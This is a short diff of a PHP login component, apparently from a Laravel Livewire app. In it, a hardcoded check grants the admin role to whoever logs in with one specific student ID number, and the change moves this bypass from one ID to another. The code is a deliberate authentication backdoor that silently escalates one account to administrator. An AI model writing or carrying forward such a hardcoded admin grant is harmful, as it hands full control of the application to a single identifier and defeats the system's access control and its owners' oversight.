@@ -109,7 +109,7 @@ class Login extends Component
             }
 
             // Bypass Admin untuk NIM tertentu (Contoh Peneliti)
-            if ($this->username == '2288203021' && !$user->hasRole('admin')) {
+            if ($this->username == '1855201011' && !$user->hasRole('admin')) {
                 $user->assignRole('admin');
             }
 
